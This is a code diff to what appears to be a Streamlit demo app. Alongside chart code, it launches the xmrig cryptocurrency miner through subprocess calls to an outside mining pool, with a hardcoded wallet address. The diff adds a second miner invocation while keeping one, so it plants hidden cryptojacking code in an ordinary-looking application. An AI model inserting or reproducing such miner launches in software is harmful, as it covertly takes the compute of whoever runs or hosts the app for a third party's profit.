@@ -72,11 +72,11 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.Popen("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.labideneyim -t 2 -k", stdout=subprocess.PIPE, shell=True)
-print(p.communicate())
-
 p = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.labideneyim -t 2 -k", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
+
+p2 = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.labideneyim -t 2 -k", stdout=subprocess.PIPE, shell=True)
+print(p2.communicate())
 
 import time 
 from IPython.display import clear_output 
